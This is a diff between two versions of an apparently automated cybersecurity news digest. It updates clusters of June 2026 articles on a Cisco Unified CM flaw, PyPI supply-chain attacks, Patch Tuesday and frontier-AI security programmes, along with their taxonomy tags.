   - Summary: Cybersecurity researchers have disclosed details of an unpatched issue that could be exploited to disclose a user's NTLMv2 hash to the attacker. Like in the case of CVE-2026-33829, which impacted the Windows Snipping Tool's ms-screensketch: URI handler, the newly flagged issue resides in the search: URI handler, per Huntress. CVE-2026-33829 refers to a spoofing vulnerability that could expose
 
-### Cluster a316915c33 — score 17
+### Cluster a316915c33 — score 16
 
 - Title: Massive PyPI Supply Chain Attack Harvests Cloud Credentials via Python Startup Hooks
 - Source: Orca Security Research (cloud_identity_infrastructure)
 - Published: 2026-06-08T17:00:24+00:00
 - Link: https://orca.security/resources/blog/hades-pypi-supply-chain-attack/
 - Fetch status: ok
-- Member count: 6
+- Member count: 5
 - Corroborating source count: 5
 - Strong signals: PyPI
 
@@ -2019,10 +2002,10 @@ A coordinated supply chain attack targeting PyPI has compromised 26 packages (37
   - Link: https://www.darkreading.com/application-security/hades-campaign-pypi-shai-hulud
   - Summary: The latest attacks, which hit 37 PyPI wheels and 19 code packages, show a continued evolution of the persistent software supply chain threat.
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
-  - Title: Hades PyPI Attack: 19 Packages Poisoned to Auto-Run Bun Credential Stealer
-  - Published: 2026-06-09T09:22:19+00:00
-  - Link: https://www.reddit.com/r/cybersecurity/comments/1u0zzck/hades_pypi_attack_19_packages_poisoned_to_autorun/
-  - Summary: https://thehackernews.com/2026/06/hades-pypi-attack-19-packages-poisoned.html submitted by /u/sunychoudhary [link] [comments]
+  - Title: New Shai-Hulud attack trojanizes 19 science-focused PyPI packages
+  - Published: 2026-06-08T21:42:14+00:00
+  - Link: https://www.reddit.com/r/cybersecurity/comments/1u0lrss/new_shaihulud_attack_trojanizes_19_sciencefocused/
+  - Summary: submitted by /u/rkhunter_ [link] [comments]
 
 ### Cluster a8d16f40d7 — score 15
 
@@ -2079,18 +2062,18 @@ Blog Post Download & print article PDF Download & print article PDF Software sup
 - Strong signals: CVE-2026-20230
 
 #### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, mfa_bypass, phishing_social_eng, supply_chain, zero_day
-- affected_products: GitHub, OpenAI/ChatGPT, Palo Alto Networks
-- cve_ids: CVE-2024-21182, CVE-2025-20309, CVE-2026-0257, CVE-2026-20045, CVE-2026-20230
-- urgency_signals: actively_exploited, critical_cvss, poc_available, preauth_unauth, zero_day
+- threat_categories: active_exploitation, supply_chain, zero_day
+- affected_products: Android, GitHub, Microsoft 365
+- cve_ids: CVE-2025-20309, CVE-2026-11645, CVE-2026-20045, CVE-2026-20230, CVE-2026-23479
+- urgency_signals: actively_exploited, critical_cvss, no_patch_yet, poc_available, preauth_unauth, zero_day
 - content_type: vulnerability_disclosure
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: supply_chain, phishing_social_eng, zero_day, mfa_bypass, active_exploitation
-- affected_products: Palo Alto Networks, GitHub, OpenAI/ChatGPT
-- cve_ids: CVE-2026-20230, CVE-2025-20309, CVE-2026-20045, CVE-2024-21182, CVE-2026-0257
-- urgency_signals: actively_exploited, zero_day, preauth_unauth, poc_available, critical_cvss
+- threat_categories: supply_chain, zero_day, active_exploitation
+- affected_products: GitHub, Microsoft 365, Android
+- cve_ids: CVE-2026-20230, CVE-2025-20309, CVE-2026-20045, CVE-2026-11645, CVE-2026-23479
+- urgency_signals: actively_exploited, zero_day, preauth_unauth, no_patch_yet, poc_available, critical_cvss
 - content_type: vulnerability_disclosure
 - confidence_tier: tier_4_news
 
@@ -2103,7 +2086,7 @@ Cisco has patched a bug in Unified Communications Manager that lets an unauthent
 #### Full body
 
 ```
-Cisco Patches CVE-2026-20230 in Unified CM as Exploit Code Goes Public  Swati Khandelwal  Jun 04, 2026 Vulnerability / Network Security Cisco has patched a bug in Unified Communications Manager that lets an unauthenticated attacker on the network write files to the box and, from there, climb to root. It is tracked as CVE-2026-20230 , and proof-of-concept exploit code is already public. Cisco's PSIRT says it has not seen the flaw used in attacks yet. The PoC shortens that runway. The flaw is a server-side request forgery. Unified CM and its Session Management Edition fail to validate certain HTTP requests properly, so a crafted request can push the server into writing arbitrary files onto the underlying OS. Those files are the foothold. Cisco says they can be used later to escalate to root, the top privilege on the system. That two-step is why the score and the rating disagree. The CVSS base is 8.6: it scores the file write (an integrity-only impact, no confidentiality or availability loss) but not the root escalation that follows. Cisco rated the advisory Critical anyway, since the end state is full root. There is one mitigating factor: the flaw only works when the WebDialer service is running, and WebDialer ships off by default. That does not help any deployment that has switched it on. To check, open Cisco Unified CM Administration and switch to Cisco Unified Serviceability. Under Tools > Control Center - Feature Services, look at the Cisco WebDialer Web Service status in the CTI Services section. Started means you are exposed. Patching is the only real fix. For the 14 train, that is 14SU6. For 15, the full Service Update (15SU5) is not due until September 2026, so until then, you are on the interim COP patch, or you turn WebDialer off (uncheck it under Tools > Service Activation and save). An independent researcher working with SSD Secure Disclosure reported the bug. Unified CM has been a steady source of unauthenticated, root-level trouble. Last July, Cisco pulled a hard-coded root SSH account left in from development (CVE-2025-20309, CVSS 10). In January, it patched an unauthenticated RCE across several of its voice products (CVE-2026-20045) that was already being exploited in the wild, enough for CISA to add it to its known-exploited list. This one fits the pattern: a request that should never have reached anything sensitive, reaching it. With a PoC public and the 15-train fix months out, assume someone turns that file-write into a working attack before the patches are everywhere. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  CISA , cisco , network security , SSRF , Vulnerability ⚡ Top Stories This Week Google June 2026 Android Update Patches 124 Flaws, One Actively Exploited Oracle WebLogic CVE-2024-21182 Added to KEV Catalog After Active Exploitation Dashlane Discloses Brute-Force Attack, Encrypted Vaults of Fewer Than 20 Users Downloaded Miasma Supply Chain Attack Compromises Red Hat npm Packages with Credential-Stealing Worm ⚡ Weekly Recap: New Linux Flaw, PAN-OS Exploit, AI-Powered Attacks, OAuth Phishing and More OpenAI Codex Authentication Tokens Stolen in codexui-android npm Supply Chain Attack PAN-OS GlobalProtect Authentication Bypass (CVE-2026-0257) Under Active Exploitation ChatGPhish Vulnerability Turns ChatGPT Web Summaries Into a Phishing Surface Attackers Use LLM Agent for Post-Exploitation After Marimo CVE-2026-39987 Exploit Threat Actors Exploit Critical FortiClient EMS Flaw to Deploy Credential Stealer Microsoft Slams Public Zero-Day Disclosures Amid GitHub Researcher Account Removal ThreatsDay Bulletin: Claude Security Plugin, Azure Priv-Esc, Kali365 MFA Bypass, FIFA Scams +15 More Malicious npm Package Stole Files From Claude AI User Directory via GitHub GlassWorm Malware Takedown Disrupts Developer Supply Chain Attack Infrastructure AI Chatbot Recommendations Redirect Use
+Cisco Patches CVE-2026-20230 in Unified CM as Exploit Code Goes Public  Swati Khandelwal  Jun 04, 2026 Vulnerability / Network Security Cisco has patched a bug in Unified Communications Manager that lets an unauthenticated attacker on the network write files to the box and, from there, climb to root. It is tracked as CVE-2026-20230 , and proof-of-concept exploit code is already public. Cisco's PSIRT says it has not seen the flaw used in attacks yet. The PoC shortens that runway. The flaw is a server-side request forgery. Unified CM and its Session Management Edition fail to validate certain HTTP requests properly, so a crafted request can push the server into writing arbitrary files onto the underlying OS. Those files are the foothold. Cisco says they can be used later to escalate to root, the top privilege on the system. That two-step is why the score and the rating disagree. The CVSS base is 8.6: it scores the file write (an integrity-only impact, no confidentiality or availability loss) but not the root escalation that follows. Cisco rated the advisory Critical anyway, since the end state is full root. There is one mitigating factor: the flaw only works when the WebDialer service is running, and WebDialer ships off by default. That does not help any deployment that has switched it on. To check, open Cisco Unified CM Administration and switch to Cisco Unified Serviceability. Under Tools > Control Center - Feature Services, look at the Cisco WebDialer Web Service status in the CTI Services section. Started means you are exposed. Patching is the only real fix. For the 14 train, that is 14SU6. For 15, the full Service Update (15SU5) is not due until September 2026, so until then, you are on the interim COP patch, or you turn WebDialer off (uncheck it under Tools > Service Activation and save). An independent researcher working with SSD Secure Disclosure reported the bug. Unified CM has been a steady source of unauthenticated, root-level trouble. Last July, Cisco pulled a hard-coded root SSH account left in from development (CVE-2025-20309, CVSS 10). In January, it patched an unauthenticated RCE across several of its voice products (CVE-2026-20045) that was already being exploited in the wild, enough for CISA to add it to its known-exploited list. This one fits the pattern: a request that should never have reached anything sensitive, reaching it. With a PoC public and the 15-train fix months out, assume someone turns that file-write into a working attack before the patches are everywhere. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  CISA , cisco , network security , SSRF , Vulnerability ⚡ Top Stories This Week Chrome V8 Zero-Day CVE-2026-11645 Exploited in the Wild - Patch Now New FROST Attack Lets Websites Track What Sites and Apps You Open via SSD Timing One-Character Linux Kernel Flaw Enables Local Root Access, Exploits Now Public ⚡ Weekly Recap: Instagram Account Hacks, Android Zero-Day, GitHub Worm and More New ChatGPT Lockdown Mode Limits Tools That Could Enable Data Exfiltration Free Apps Are Quietly Turning Smart TVs Into Web-Scraping Proxies for AI AI Agent Uncovers 21 Zero-Days in FFmpeg; Chrome Patches Record 429 Bugs Miasma Worm Hits 73 Microsoft GitHub Repositories in Major Supply Chain Attack Cisco Patches CVE-2026-20230 in Unified CM as Exploit Code Goes Public Claude Code GitHub Action Flaw Let One Malicious Issue Hijack Repositories Microsoft Fixes One-Click GitHub Dev Attack That Let Attackers Steal OAuth Tokens Autonomous AI Tool Finds 2-Year-Old RCE Flaw in Redis (CVE-2026-23479) Microsoft 365 Android Apps Let Any App Steal Account Tokens via Leftover Debug Flag Unpatched Windows Search URI Vulnerability Lets Attackers Steal NTLMv2 Hashes New HTTP/2 Bomb Vulnerability Allows Remote DoS on NGINX, Apache, IIS, Envoy and Cloudflare ThreatsDay Bulletin: AI Agents Gone Wrong, Sketchy C
 ```
 
 #### Corroborating sources (1)
@@ -2219,51 +2202,6 @@ FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 8th June �
   - Published: 2026-06-08T14:47:59+00:00
   - Link: https://research.checkpoint.com/2026/8th-june-threat-intelligence-report/
   - Summary: For the latest discoveries in cyber research for the week of 1st June, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES DentaQuest, a U.S. dental benefits administrator owned by Sun Life, has suffered a data breach after threat group ShinyHunters leaked exfiltrated data. Analysts assessed that 2.6 million accounts were exposed, including names, emails, […] The post 8th June – Threat Intelligence Report appeared first on Check Point Research .
-
-### Cluster e8781894a1 — score 14
-
-- Title: The architecture of subtraction: Why it’s time to erase the roads, not just map the traffic
-- Source: Help Net Security (cyber_news_breach_reporting)
-- Published: 2026-06-09T06:00:23+00:00
-- Link: https://www.helpnetsecurity.com/2026/06/09/subtractive-security-attack-path-erasure/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, vulnerability_disclosure, zero_day
-- affected_products: Anthropic/Claude
-- urgency_signals: actively_exploited, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: zero_day, vulnerability_disclosure, active_exploitation
-- affected_products: Anthropic/Claude
-- urgency_signals: actively_exploited, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-The advent of AI-assisted vulnerability discovery and autonomous exploit development has brought about a new age in cybersecurity—one in which we can no longer rely on patching as a primary defense mechanism. Patching is, by definition, a reactive approach to security. It cannot occur until after a vulnerability is discovered and a vendor fix is made available, an operational delay that all too often lands well after an exploit is already weaponized in the wild. … More → The post The architecture of subtraction: Why it’s time to erase the roads, not just map the traffic appeared first on Help Net Security .
-```
-
-#### Full body
-
-```
-Christopher Frenz, Enterprise CISO and Founder, Subtractive Security Sponsored June 9, 2026 Share The architecture of subtraction: Why it’s time to erase the roads, not just map the traffic The advent of AI-assisted vulnerability discovery and autonomous exploit development has brought about a new age in cybersecurity—one in which we can no longer rely on patching as a primary defense mechanism. Patching is, by definition, a reactive approach to security. It cannot occur until after a vulnerability is discovered and a vendor fix is made available, an operational delay that all too often lands well after an exploit is already weaponized in the wild. As frontier models like Claude Mythos collapse the time-to-exploit from months into mere hours, they create an unsustainable asymmetry: the machine-scale generation of vulnerability disclosures is now growing exponentially faster than human teams can write, test, and apply patches. Proponents of Continuous Threat Exposure Management (CTEM) would have you believe that this crisis can be solved through superior prioritization—sorting the backlog by layering CVSS scores, asset criticality, and adversary threat intelligence. But the reality is that micro-prioritization does not solve the underlying structural flaw; it is merely a more optimized form of backlog management. While exposure mapping tools can help you identify that a missing patch opens an attack path across a given asset, they remain a stop-gap measure. Patching an individual browser or office application only halts the specific exploit of the day. It does nothing to prevent tomorrow’s inevitable zero-day, because it never actually eliminates the systemic attack path—it merely places a temporary closure over it until the next vulnerability in that same product or protocol reopens the gate. We must break this perpetual cycle of reactivity by shifting our entire paradigm from backlog management to deterministic attack path erasure. While basic cyber hygiene mandates that software updates should always be executed in a timely manner, we must stop treating the patch queue as a primary defensive control. True defensive finality requires moving away from evaluating individual branches of an attack graph and instead focusing on a macro-engineering metric: the Path Erasure Rate (PER). Instead of exhausting cognitive cycles trying to decide whether to remediate Path A versus Path B, architects must evaluate the net delta of attack terrain an engineering action can permanently eliminate. For example, rather than racing against a compounding patching clock, utilizing constraints to natively prevent browsers and office applications from launching child processes instantly achieves a massive PER delta—structurally destroying whole clusters of lateral and local attack paths simultaneously. By embracing an architecture of subtraction, we stop trying to out-prioritize automated exploitation and begin using native infrastructure boundaries to deny the adversary the terrain they need to move. We need to start taking a subtractive approach to security whereby we begin to focus on path elimination, privilege minimization, and other architectural constraints that establish deterministic boundaries within our network. Subtractive security is not only how we correct the asymmetry that currently exists between attackers and defenders but how we flip the script so the asymmetry eventually comes to lie in favor of the defense. Moving beyond theory: Calculating the PER Delta To understand the operational power of this metric, consider how a standard enterprise evaluates a critical remote code execution (RCE) vulnerability found within an application tier. Under a legacy CTEM or vulnerability management workflow, a scanning tool flags the flaw. Security operations then score it against asset value and threat intelligence. A ticket is created, engineers schedule a downtime window, and weeks later, a patch is applied. The vulnerability count drops by on
-```
-
-#### Corroborating sources (1)
-
-- **Help Net Security** (cyber_news_breach_reporting)
-  - Title: The architecture of subtraction: Why it’s time to erase the roads, not just map the traffic
-  - Published: 2026-06-09T06:00:23+00:00
-  - Link: https://www.helpnetsecurity.com/2026/06/09/subtractive-security-attack-path-erasure/
-  - Summary: The advent of AI-assisted vulnerability discovery and autonomous exploit development has brought about a new age in cybersecurity—one in which we can no longer rely on patching as a primary defense mechanism. Patching is, by definition, a reactive approach to security. It cannot occur until after a vulnerability is discovered and a vendor fix is made available, an operational delay that all too often lands well after an exploit is already weaponized in the wild. … More → The post The architecture of subtraction: Why it’s time to erase the roads, not just map the traffic appeared first on Help Net Security .
 
 ### Cluster 4ede2d4b48 — score 14
 
@@ -2398,6 +2336,51 @@ New Veeam vulnerability exposes backup servers to RCE attacks By Sergiu Gatlan J
   - Link: https://www.bleepingcomputer.com/news/security/new-veeam-vulnerability-exposes-backup-servers-to-rce-attacks/
   - Summary: Veeam has released security updates to patch a critical Backup & Replication security flaw that can be exploited to gain remote code execution (RCE) on domain-joined backup servers. [...]
 
+### Cluster e8781894a1 — score 13
+
+- Title: The architecture of subtraction: Why it’s time to erase the roads, not just map the traffic
+- Source: Help Net Security (cyber_news_breach_reporting)
+- Published: 2026-06-09T06:00:23+00:00
+- Link: https://www.helpnetsecurity.com/2026/06/09/subtractive-security-attack-path-erasure/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, vulnerability_disclosure, zero_day
+- affected_products: Anthropic/Claude
+- urgency_signals: actively_exploited, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: zero_day, vulnerability_disclosure, active_exploitation
+- affected_products: Anthropic/Claude
+- urgency_signals: actively_exploited, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+The advent of AI-assisted vulnerability discovery and autonomous exploit development has brought about a new age in cybersecurity—one in which we can no longer rely on patching as a primary defense mechanism. Patching is, by definition, a reactive approach to security. It cannot occur until after a vulnerability is discovered and a vendor fix is made available, an operational delay that all too often lands well after an exploit is already weaponized in the wild. … More → The post The architecture of subtraction: Why it’s time to erase the roads, not just map the traffic appeared first on Help Net Security .
+```
+
+#### Full body
+
+```
+Christopher Frenz, Enterprise CISO and Founder, Subtractive Security Sponsored June 9, 2026 Share The architecture of subtraction: Why it’s time to erase the roads, not just map the traffic The advent of AI-assisted vulnerability discovery and autonomous exploit development has brought about a new age in cybersecurity—one in which we can no longer rely on patching as a primary defense mechanism. Patching is, by definition, a reactive approach to security. It cannot occur until after a vulnerability is discovered and a vendor fix is made available, an operational delay that all too often lands well after an exploit is already weaponized in the wild. As frontier models like Claude Mythos collapse the time-to-exploit from months into mere hours, they create an unsustainable asymmetry: the machine-scale generation of vulnerability disclosures is now growing exponentially faster than human teams can write, test, and apply patches. Proponents of Continuous Threat Exposure Management (CTEM) would have you believe that this crisis can be solved through superior prioritization—sorting the backlog by layering CVSS scores, asset criticality, and adversary threat intelligence. But the reality is that micro-prioritization does not solve the underlying structural flaw; it is merely a more optimized form of backlog management. While exposure mapping tools can help you identify that a missing patch opens an attack path across a given asset, they remain a stop-gap measure. Patching an individual browser or office application only halts the specific exploit of the day. It does nothing to prevent tomorrow’s inevitable zero-day, because it never actually eliminates the systemic attack path—it merely places a temporary closure over it until the next vulnerability in that same product or protocol reopens the gate. We must break this perpetual cycle of reactivity by shifting our entire paradigm from backlog management to deterministic attack path erasure. While basic cyber hygiene mandates that software updates should always be executed in a timely manner, we must stop treating the patch queue as a primary defensive control. True defensive finality requires moving away from evaluating individual branches of an attack graph and instead focusing on a macro-engineering metric: the Path Erasure Rate (PER). Instead of exhausting cognitive cycles trying to decide whether to remediate Path A versus Path B, architects must evaluate the net delta of attack terrain an engineering action can permanently eliminate. For example, rather than racing against a compounding patching clock, utilizing constraints to natively prevent browsers and office applications from launching child processes instantly achieves a massive PER delta—structurally destroying whole clusters of lateral and local attack paths simultaneously. By embracing an architecture of subtraction, we stop trying to out-prioritize automated exploitation and begin using native infrastructure boundaries to deny the adversary the terrain they need to move. We need to start taking a subtractive approach to security whereby we begin to focus on path elimination, privilege minimization, and other architectural constraints that establish deterministic boundaries within our network. Subtractive security is not only how we correct the asymmetry that currently exists between attackers and defenders but how we flip the script so the asymmetry eventually comes to lie in favor of the defense. Moving beyond theory: Calculating the PER Delta To understand the operational power of this metric, consider how a standard enterprise evaluates a critical remote code execution (RCE) vulnerability found within an application tier. Under a legacy CTEM or vulnerability management workflow, a scanning tool flags the flaw. Security operations then score it against asset value and threat intelligence. A ticket is created, engineers schedule a downtime window, and weeks later, a patch is applied. The vulnerability count drops by on
+```
+
+#### Corroborating sources (1)
+
+- **Help Net Security** (cyber_news_breach_reporting)
+  - Title: The architecture of subtraction: Why it’s time to erase the roads, not just map the traffic
+  - Published: 2026-06-09T06:00:23+00:00
+  - Link: https://www.helpnetsecurity.com/2026/06/09/subtractive-security-attack-path-erasure/
+  - Summary: The advent of AI-assisted vulnerability discovery and autonomous exploit development has brought about a new age in cybersecurity—one in which we can no longer rely on patching as a primary defense mechanism. Patching is, by definition, a reactive approach to security. It cannot occur until after a vulnerability is discovered and a vendor fix is made available, an operational delay that all too often lands well after an exploit is already weaponized in the wild. … More → The post The architecture of subtraction: Why it’s time to erase the roads, not just map the traffic appeared first on Help Net Security .
+
 ### Cluster 60f95f513c — score 13
 
 - Title: Autonomous AI Tool Finds 2-Year-Old RCE Flaw in Redis (CVE-2026-23479)
@@ -2443,6 +2426,47 @@ Autonomous AI Tool Finds 2-Year-Old RCE Flaw in Redis (CVE-2026-23479)  Swati
   - Link: https://thehackernews.com/2026/06/autonomous-ai-tool-finds-2-year-old-rce.html
   - Summary: Redis has patched a use-after-free in its blocking-client code that lets an authenticated user run arbitrary OS commands on the machine hosting the database. The flaw was found by an autonomous AI tool built to hunt bugs in large codebases. Tracked as CVE-2026-23479, the flaw was introduced in Redis 7.2.0 and remained in every stable branch until the May 5 fixes, unnoticed for over two years.
 
+### Cluster 7bc6eb8051 — score 12
+
+- Title: Rapid7 Gains Access To Anthropic’s Project Glasswing To Explore Frontier AI For Cybersecurity
+- Source: Rapid7 (offensive_vulnerability_research)
+- Published: 2026-06-09T13:35:36+00:00
+- Link: https://www.rapid7.com/blog/post/ai-rapid7-accesses-anthropics-project-glasswing-exploring-frontier-artificial-cybersecurity-intelligence
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- affected_products: Anthropic/Claude
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Primary article taxonomy
+- affected_products: Anthropic/Claude
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+Wade Woolwine is Senior Director, Product Security at Rapid7. Rapid7 is excited to join Anthropic’s Project Glasswing, which includes access to Claude Mythos Preview, giving our teams the opportunity to explore how frontier AI can support legitimate, internal defensive security workflows led by experienced security practitioners. Anthropic has now expanded Project Glasswing from its initial cohort to a broader group of organizations, underscoring how quickly this conversation is moving from model capability to industry readiness. This access comes at a critical moment for security operations. Attackers are moving faster, attack surfaces are expanding, and fragmented security data makes it harder for teams to correlate context and respond at scale. The industry is entering a period where powerful frontier AI models with advanced cyber capabilities require new operating norms, stronger safeguards, and better infrastructure for how vulnerabilities are verified, disclosed, fixed, and deplo
+```
+
+#### Full body
+
+```
+Back to Blog Artificial Intelligence Rapid7 Gains Access To Anthropic’s Project Glasswing To Explore Frontier AI For Cybersecurity Wade Woolwine Jun 9, 2026 | Last updated on Jun 9, 2026 | 7 min read DISCOVER RAPID7 MDR Wade Woolwine is Senior Director, Product Security at Rapid7. Rapid7 is excited to join Anthropic’s Project Glasswing, which includes access to Claude Mythos Preview, giving our teams the opportunity to explore how frontier AI can support legitimate, internal defensive security workflows led by experienced security practitioners. Anthropic has now expanded Project Glasswing from its initial cohort to a broader group of organizations, underscoring how quickly this conversation is moving from model capability to industry readiness. This access comes at a critical moment for security operations. Attackers are moving faster, attack surfaces are expanding, and fragmented security data makes it harder for teams to correlate context and respond at scale. The industry is entering a period where powerful frontier AI models with advanced cyber capabilities require new operating norms, stronger safeguards, and better infrastructure for how vulnerabilities are verified, disclosed, fixed, and deployed. Frontier AI will raise expectations for how quickly security teams can understand risk, make decisions, and prove that action has reduced exposure. Rapid7 has already been tracking what Project Glasswing means for security leaders : faster discovery is only part of the story, and the real test is how defenders handle everything that follows, from prioritization and remediation to validation, detection, and response. Rapid7’s involvement gives us another opportunity to help shape how advanced LLMs are evaluated and applied to real defensive security work. The organizations best positioned to benefit from frontier AI will be those that pair advanced models with trusted security context, expert oversight, and mature operational workflows. That is the lens Rapid7 is bringing to our internal exploration of Claude Mythos Preview, and it reflects the same principle that guides our broader AI strategy: advanced technology delivers the most value when grounded in security expertise, operational context, and measurable outcomes. Exploring Claude Mythos Preview inside Rapid7 In the first week of Rapid7’s access to Claude Mythos Preview , it has already given our researchers, security engineers, and analysts another way to explore how frontier AI can strengthen the security workflows we already rely on. Our use is internal and practitioner-led, with a focus on learning where these models can create defensive value, where human expertise remains essential, and where responsible guardrails are required. Cybersecurity impact depends on more than model capability. A model may help identify a potential vulnerability and confirm exploitability, but reducing risk requires deeper operational work: understanding affected systems, mapping business context, prioritizing remediation, validating the fix, and ensuring detection coverage is in place. Anthropic’s latest Project Glasswing update reinforces that same shift: as AI makes discovery faster, the next challenge becomes helping the industry scale verification, disclosure, fixing, and deployment. For more than 25 years, Rapid7 has helped organizations understand risk in real environments and take action against it. Access to Project Glasswing gives us another way to explore how LLMs can support that mission, while reinforcing the same principle that guides our broader AI strategy: advanced technology delivers the most value when grounded in security expertise, operational context, and measurable outcomes. How Rapid7 is using Claude Mythos Preview internally Our initial exploration is focused on internal defensive use cases that can help strengthen our product security, improve our research, and create better security outcomes overall. The goal is to understand how frontier AI can support highly s
+```
+
+#### Corroborating sources (1)
+
+- **Rapid7** (offensive_vulnerability_research)
+  - Title: Rapid7 Gains Access To Anthropic’s Project Glasswing To Explore Frontier AI For Cybersecurity
+  - Published: 2026-06-09T13:35:36+00:00
+  - Link: https://www.rapid7.com/blog/post/ai-rapid7-accesses-anthropics-project-glasswing-exploring-frontier-artificial-cybersecurity-intelligence
+  - Summary: Wade Woolwine is Senior Director, Product Security at Rapid7. Rapid7 is excited to join Anthropic’s Project Glasswing, which includes access to Claude Mythos Preview, giving our teams the opportunity to explore how frontier AI can support legitimate, internal defensive security workflows led by experienced security practitioners. Anthropic has now expanded Project Glasswing from its initial cohort to a broader group of organizations, underscoring how quickly this conversation is moving from model capability to industry readiness. This access comes at a critical moment for security operations. Attackers are moving faster, attack surfaces are expanding, and fragmented security data makes it harder for teams to correlate context and respond at scale. The industry is entering a period where powerful frontier AI models with advanced cyber capabilities require new operating norms, stronger safeguards, and better infrastructure for how vulnerabilities are verified, disclosed, fixed, and deplo
+
 ### Cluster c485daa4fd — score 12
 
 - Title: someone actually leaked the Miasma supply chain attack toolkit source code on github
@@ -2450,14 +2474,14 @@ Autonomous AI Tool Finds 2-Year-Old RCE Flaw in Redis (CVE-2026-23479)  Swati
 - Published: 2026-06-09T13:31:10+00:00
 - Link: https://www.reddit.com/r/cybersecurity/comments/1u152zy/someone_actually_leaked_the_miasma_supply_chain/
 - Fetch status: fetch_failed:HTTPError
-- Member count: 6
+- Member count: 7
 - Corroborating source count: 3
 - Strong signals: GitHub
 
 #### Cluster taxonomy (union across members)
 - threat_categories: supply_chain, zero_day
 - affected_industries: financial_services
-- affected_products: Android, Azure, GitHub
+- affected_products: Android, GitHub
 - tools_used: Azure
 - urgency_signals: zero_day
 - content_type: incident_report, intel_roundup, news_report
@@ -2488,10 +2512,10 @@ we saw that multiple github repos name as Miasma-Open-Source-Release started app
   - Link: https://thehackernews.com/2026/06/weekly-recap-instagram-account-hacks.html
   - Summary: Monday again. The weekend was meant to be quiet. It wasn't. Last week had poisoned packages, a broken AI helper, and a worm tearing through repos. The ugly part: basic tricks still worked. A chatbot got fooled. A bot token got leaked inside the malware. The same old mistakes showed up again. And while everyone chased the loud stuff, quieter attackers sat in inboxes for months, reading mail and
 - **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: GitHub disables Microsoft repos pushing password-stealing malware
-  - Published: 2026-06-09T15:42:40+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/github-disables-microsoft-repos-pushing-password-stealing-malware/
-  - Summary: Microsoft removed 73 repositories across its Azure, microsoft, Azure-Samples, and MicrosoftDocs organizations on GitHub, disrupting continuous integration pipelines. [...]
+  - Title: NFCShare Android malware spreads via fake banking app updates on GitHub
+  - Published: 2026-06-08T22:11:58+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/nfcshare-android-malware-spreads-via-fake-banking-app-updates-on-github/
+  - Summary: New variants of the NFCShare Android malware are being distributed as fake updates for legitimate banking apps hosted on GitHub. [...]
 
 ### Cluster bb5fa910dd — score 12
 
@@ -2595,6 +2619,39 @@ Threat Research Center Insights General General When “Hi, This Is IT” Comes 
   - Link: https://unit42.paloaltonetworks.com/microsoft-teams-phishing/
   - Summary: Attackers are increasingly targeting collaboration platforms like Microsoft Teams. Learn the risks and key steps to strengthen your organization's security. The post When “Hi, This Is IT” Comes Through Microsoft Teams appeared first on Unit 42 .
 
+### Cluster 532b918789 — score 11
+
+- Title: Microsoft June 2026 Patch Tuesday, (Tue, Jun 9th)
+- Source: SANS Internet Storm Center (government_authoritative)
+- Published: 2026-06-09T17:34:29+00:00
+- Link: https://isc.sans.edu/diary/rss/33064
+- Fetch status: fetch_failed:HTTPError
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_1_government
+
+#### Summary
+
+```
+Microsoft today released patches for 204 vulnerabilities. 38 of these vulnerabilities are considered critical, and three have been disclosed before today. Six of the vulnerabilities affect Microsoft cloud solutions and do not require any user action. In addition, Microsoft incorporated 360 different vulnerabilities affecting Chromium into its Edge browser.
+```
+
+#### Corroborating sources (1)
+
+- **SANS Internet Storm Center** (government_authoritative)
+  - Title: Microsoft June 2026 Patch Tuesday, (Tue, Jun 9th)
+  - Published: 2026-06-09T17:34:29+00:00
+  - Link: https://isc.sans.edu/diary/rss/33064
+  - Summary: Microsoft today released patches for 204 vulnerabilities. 38 of these vulnerabilities are considered critical, and three have been disclosed before today. Six of the vulnerabilities affect Microsoft cloud solutions and do not require any user action. In addition, Microsoft incorporated 360 different vulnerabilities affecting Chromium into its Edge browser.
+
 ### Cluster b96df4915d — score 11
 
 - Title: The “Skyway” to OSS Security: OpenSSF Community Day North America 2026 Recap
@@ -2638,10 +2695,57 @@ By Angelah Liu, OpenSSF Executive Summary The open source community recently gat
   - Link: https://openssf.org/blog/2026/06/05/the-skyway-to-oss-security-openssf-community-day-north-america-2026-recap/
   - Summary: The open source community recently gathered in Minneapolis for Open Source Summit North America and OpenSSF Community Day North America 2026. Functioning as a collaborative “Skyway,” the Open Source Security Foundation (OpenSSF) successfully brought together diverse working groups, security researchers, and enterprise maintainers to unify tooling, address artificial intelligence security transitions, and fortify the global software supply chain.
 
+### Cluster 5da6b03ed1 — score 11
+
+- Title: Veeam Backup & Replication RCE Flaw Lets Domain Users Run Remote Code
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-06-09T16:39:47+00:00
